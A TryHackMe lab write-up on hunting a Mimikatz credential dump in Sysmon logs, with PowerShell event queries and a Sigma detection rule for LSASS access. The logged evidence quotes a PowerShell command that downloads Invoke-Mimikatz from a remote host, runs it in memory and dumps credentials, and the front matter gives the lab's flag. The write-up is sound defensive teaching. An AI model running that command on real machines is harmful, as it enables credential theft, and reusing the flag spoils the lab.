---
title: "TryHackMe - Windows Event Logs & Sysmon Threat Hunting"
description: "Hands-on threat hunting lab detecting credential dumping via Mimikatz, malicious service installations, and privilege escalation using Sysmon Event IDs."
publishDate: "2026-01-29"
category: "Threat Hunting"
platform: "TryHackMe"
difficulty: "Medium"
tags: ["sysmon", "evtx", "mimikatz", "credential-dumping", "event-id-1", "event-id-8", "threat-hunting"]
artifacts: ["Sysmon-Operational.evtx", "Security.evtx"]
mitreAttck: ["T1003.001 (LSASS Memory)", "T1059.001 (PowerShell)", "T1543.003 (Windows Service)"]
verdict: "Mimikatz `sekurlsa::logonpasswords` dumped from LSASS memory"
flag: "THM{sysm0n_hunt3r_ls4ss_dEtEct3d_891}"
featured: true
---

## 1. Objective

Investigating an incident where an adversary obtained local administrative access and executed credential harvesting tools to extract domain hashes.

We analyze exported Windows Event Log files (`.evtx`) using PowerShell and `Chainsaw` / `Hayabusa`.

---

## 2. Detecting Process Creation (Sysmon Event ID 1)

Using PowerShell's `Get-WinEvent` to inspect commands executed:

```powershell
Get-WinEvent -Path .\Sysmon-Operational.evtx -FilterXPath "*[System[(EventID=1)]]" | 
  Select-Object TimeCreated, @{N='Command';E={$_.Properties[10].Value}} | 
  Where-Object {$_.Command -match 'powershell|cmd|certutil'}
```

### Key Event Found:
```text
TimeCreated : 2026-01-29 14:22:18
Command     : powershell.exe -ep bypass -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.9/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
```

The attacker downloaded `Invoke-Mimikatz.ps1` in-memory directly into PowerShell memory to evade disk-based AV scanners.

---

## 3. Detecting Process Access & LSASS Tampering (Sysmon Event ID 10)

When Mimikatz dumps credentials, it opens a handle to `lsass.exe` with `PROCESS_VM_READ` (0x0010) and `PROCESS_QUERY_INFORMATION` (0x0400).

Filtering Sysmon Event ID 10 where TargetImage is `lsass.exe`:

```powershell
Get-WinEvent -Path .\Sysmon-Operational.evtx -FilterXPath "*[System[(EventID=10)]] and *[EventData[Data[@Name='TargetImage'] and (contains(., 'lsass.exe'))]]" | 
  Select-Object TimeCreated, 
    @{N='Source';E={$_.Properties[4].Value}}, 
    @{N='Target';E={$_.Properties[5].Value}}, 
    @{N='Access';E={$_.Properties[6].Value}}
```

### Result:
- **SourceImage**: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
- **TargetImage**: `C:\Windows\System32\lsass.exe`
- **GrantedAccess**: `0x1010` (PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION)

---

## 4. Detection Engineering Rule (Sigma)

To detect this attack across the SIEM:

```yaml
title: LSASS Memory Access via PowerShell
id: 54b38d38-98e3-4c99-b1d5-b0b2e3f5b214
status: test
description: Detects PowerShell opening handle to lsass.exe for credential dumping
logsource:
  category: process_access
  product: windows
detection:
  selection:
    TargetImage|endswith: '\lsass.exe'
    SourceImage|endswith: '\powershell.exe'
    GrantedAccess|contains:
      - '0x1010'
      - '0x1038'
      - '0x1F0FFF'
  condition: selection
level: critical
tags:
  - attack.credential_access
  - attack.t1003.001
```
